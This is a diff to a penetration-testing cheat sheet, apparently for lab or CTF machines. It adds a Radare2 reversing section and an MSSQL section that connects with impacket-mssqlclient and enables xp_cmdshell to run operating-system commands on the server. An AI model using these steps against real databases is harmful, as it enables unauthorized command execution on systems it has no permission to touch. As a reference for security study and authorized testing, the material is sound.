@@ -54,6 +54,25 @@ getcap -r / 2>/dev/null
 ------------------------------------------------------------------------------------------------------
 # Windows Section
 
+## MSSQL Server
+
+Connecting with [impackets-msqlclient](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py)
+
+```bash
+impacket-mssqlclient domain/user:password@10.10.10.250
+```
+
+Show advanced options and activate **xp_cmdshell**
+
+```shell
+SQL> sp_configure "show advanced options", 1
+SQL> reconfigure
+SQL> sp_configure "xp_cmdshell", 1
+SQL> reconfigure
+SQL> xp_cmdshell "whoami"
+SQL> xp_cmdshell "whoami"
+```
+
 ## Active Directory Enumeration
 
 ### SMBClient
@@ -70,6 +89,7 @@ smbmap -H 10.10.10.250 -u 'null'
 
 # Authenticated to a share 
 smbmap -H 10.10.10.250 -u
+
 ```
 
 ### RPCClient
@@ -328,6 +348,32 @@ remote port forwarding to be able to access that port from outside.
 lsof -i:9512
 ```
  
+------------------------------------------------------------------------------------------------------
+
+# Reversing
+
+## Radare2
+
+Analyze all functions
+
+```shell
+aaa
+```
+
+List all functions
+
+```shell
+afl
+```
+
+Sync to a main function
+
+```shell
+s main
+pdf
+pdc
+```
+
 ------------------------------------------------------------------------------------------------------
 
 # Extra
